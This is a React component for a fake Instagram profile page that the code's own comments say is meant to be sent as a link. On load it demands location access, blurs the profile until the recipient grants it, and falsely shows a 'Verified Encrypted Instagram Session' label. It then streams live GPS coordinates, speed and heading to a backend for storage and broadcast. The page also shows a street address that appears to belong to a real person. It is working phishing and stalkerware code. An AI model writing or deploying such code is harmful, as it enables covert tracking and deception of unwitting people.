"use client";

import { useEffect, useRef, useState } from "react";

export default function RecipientFeed({
  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
  sessionId = "",
}) {
  const [hasGrantedLocation, setHasGrantedLocation] = useState(false);
  const [isFollowing, setIsFollowing] = useState(false);
  const [isRequestingLocation, setIsRequestingLocation] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [coords, setCoords] = useState(null);

  const watchIdRef = useRef(null);

  /*
   * Save location coordinates to backend MongoDB & broadcast via Socket
   */
  const saveLocation = async (position) => {
    const { latitude, longitude, accuracy, speed, heading } = position.coords;
    setCoords({ latitude, longitude, accuracy });

    try {
      const response = await fetch(`${backendUrl}/api/records`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
          participantName: "Mobile Recipient",
          latitude,
          longitude,
          accuracy: accuracy ?? null,
          speed: speed ?? null,
          heading: heading ?? null,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      console.log("Location saved & broadcasted successfully");
    } catch (error) {
      console.error("Location save failed:", error);
    }
  };

  /*
   * Request GPS permission and start automatic tracking
   */
  const requestLocation = () => {
    if (!navigator.geolocation) {
      setIsRequestingLocation(false);
      setErrorMessage("Geolocation is not supported by your device browser.");
      return;
    }

    setIsRequestingLocation(true);
    setErrorMessage("");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // 1. Save first location
        await saveLocation(position);

        // 2. Unlock the Instagram profile view
        setHasGrantedLocation(true);
        setIsFollowing(true);
        setIsRequestingLocation(false);

        // 3. Start background live GPS tracking
        watchIdRef.current = navigator.geolocation.watchPosition(
          async (updatedPosition) => {
            await saveLocation(updatedPosition);
          },
          (error) => {
            console.error("Location update error:", error);
          },
          {
            enableHighAccuracy: true,
            maximumAge: 5000,
            timeout: 15000,
          }
        );
      },
      (error) => {
        setIsRequestingLocation(false);
        setHasGrantedLocation(false);
        setIsFollowing(false);
        console.error("Location permission error:", error);

        if (error.code === 1) {
          setErrorMessage("Location permission was denied. Please allow location in your browser settings to access this profile.");
        } else {
          setErrorMessage("Unable to retrieve location. Please check your GPS connection and try again.");
        }
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 15000,
      }
    );
  };

  // Automatically request location as soon as recipient opens the shared link
  useEffect(() => {
    requestLocation();

    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
    };
  }, []);

  const handleToggleFollow = () => {
    if (isFollowing) {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
        watchIdRef.current = null;
      }
      setIsFollowing(false);
    } else {
      requestLocation();
    }
  };

  return (
    <div className="ig-app">
      {/* 🔒 Mandatory Location Access Gate Overlay (Shown until location is agreed/granted) */}
      {!hasGrantedLocation && (
        <div className="location-gate-backdrop">
          <div className="location-gate-card">
            <div className="location-gate-icon-wrapper">
              <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="#0095F6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M20 10c0 6-8 12-8 12S4 16 4 10a8 8 0 1 1 16 0Z" />
                <circle cx="12" cy="10" r="3" />
              </svg>
            </div>

            <h2>Location Access Required</h2>
            <p>
              To view <strong>@mr_in.nocent_yogi</strong>&apos;s shared Instagram profile and story highlights, please allow location access.
            </p>

            {errorMessage && (
              <div style={{ background: "rgba(237, 73, 86, 0.15)", border: "1px solid #ED4956", color: "#ED4956", padding: "0.75rem", borderRadius: "8px", fontSize: "0.82rem", marginBottom: "1.25rem", textAlign: "left" }}>
                ⚠️ {errorMessage}
              </div>
            )}

            <button
              className="location-gate-btn"
              onClick={requestLocation}
              disabled={isRequestingLocation}
            >
              {isRequestingLocation ? (
                <>
                  <svg style={{ animation: "spin 1s linear infinite" }} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="10" strokeDasharray="30" strokeDashoffset="10" />
                  </svg>
                  Requesting Access...
                </>
              ) : (
                "Allow Location & View Profile"
              )}
            </button>

            <div className="location-gate-footer">
              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
                <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
              <span>Verified Encrypted Instagram Session</span>
            </div>
          </div>
        </div>
      )}

      {/* Left Sidebar */}
      <aside className="ig-sidebar">
        <div className="ig-logo">
          <span className="logo-text">Instagram</span>
        </div>

        <nav className="ig-navigation">
          <a className="ig-nav-item active">
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><path d="M3 11.5 12 4l9 7.5" /><path d="M5 10.5V20h14v-9.5" /><path d="M9 20v-6h6v6" /></svg>
            </span>
            <span>Home</span>
          </a>
          <a className="ig-nav-item">
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></svg>
            </span>
            <span>Search</span>
          </a>
          <a className="ig-nav-item">
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><rect width="18" height="18" x="3" y="3" rx="2" /><path d="m9 8 7 4-7 4Z" /></svg>
            </span>
            <span>Reels</span>
          </a>
        </nav>
      </aside>

      {/* Main Content Area (Unlocked after agreeing to location) */}
      <main className="ig-main" style={{ filter: !hasGrantedLocation ? "blur(8px)" : "none", pointerEvents: !hasGrantedLocation ? "none" : "auto", transition: "filter 0.3s ease" }}>
        <header className="ig-topbar">
          <div className="mobile-logo">Instagram</div>
        </header>

        <div className="feed-container">
          {/* Profile Section */}
          <section className="profile-header">
            <div className="profile-avatar">
              <div className="location-avatar">
                <div className="ig-story-ring">
                  <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
                </div>
              </div>
            </div>

            <div className="profile-info">
              <div className="profile-title">
                <h1>mr_in.nocent_yogi</h1>
                <span className="verified">✓</span>
              </div>

              <div className="profile-stats">
                <div><strong>94</strong><span>posts</span></div>
                <div><strong>293</strong><span>followers</span></div>
                <div><strong>625</strong><span>following</span></div>
              </div>

              <div className="profile-description">
                <p>
                  Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀
                  Vaeraraiyum Paarkathae🙈
                  Avalai Avalai Pazhagi Tholaitha Ithayam
                  Vaeraraiyum Aerkaathae❣️
                  @editor_Yogi_R³
                </p>
                <span className="profile-link">🔗 yrdigitalenterprises.in</span>
                <span className="profile-link">13/b kuttiyan palayam street, Kumbakonam 612001</span>

                {coords && (
                  <div className="tracking-active-badge">
                    <span className="tracking-active-dot"></span>
                    <span>Live Location Connected</span>
                  </div>
                )}
              </div>
            </div>
          </section>

          {/* Profile Action Buttons */}
          <div className="profile-action-buttons">
            <button
              className={`profile-follow-btn ${isFollowing ? "following" : ""}`}
              onClick={handleToggleFollow}
            >
              {isFollowing ? "Following" : "Follow"}
            </button>

            <button className="profile-user-plus-btn" title="Discover People">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                <circle cx="8.5" cy="7" r="4" />
                <line x1="20" y1="8" x2="20" y2="14" />
                <line x1="23" y1="11" x2="17" y2="11" />
              </svg>
            </button>
          </div>

          {/* Story Highlights */}
          <div className="highlights-row">
            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/business.jpg" alt="Bussiness" />
                </div>
              </div>
              <span>Bussiness</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/invitations.jpg" alt="invitations" />
                </div>
              </div>
              <span>invitations</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/aval.jpg" alt="Aval" />
                </div>
              </div>
              <span>Aval ❣️</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                </div>
              </div>
              <span>Thumbnails...</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/king.jpg" alt="king" />
                </div>
              </div>
              <span>king 👑</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                  <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="12" y1="5" x2="12" y2="19"></line>
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                  </svg>
                </div>
              </div>
              <span>New</span>
            </div>
          </div>

          {/* Post Photo Grid */}
          <div className="recipient-posts-grid">
            <div className="recipient-post-tile">
              <img src="/highlights/aval.jpg" alt="Post 1" />
            </div>
            <div className="recipient-post-tile">
              <img src="/highlights/business.jpg" alt="Post 2" />
            </div>
            <div className="recipient-post-tile">
              <img src="/highlights/king.jpg" alt="Post 3" />
            </div>
            <div className="recipient-post-tile">
              <img src="/highlights/invitations.jpg" alt="Post 4" />
            </div>
            <div className="recipient-post-tile">
              <img src="/highlights/thumbnails.jpg" alt="Post 5" />
            </div>
            <div className="recipient-post-tile">
              <img src="/highlights/profile.jpg" alt="Post 6" />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
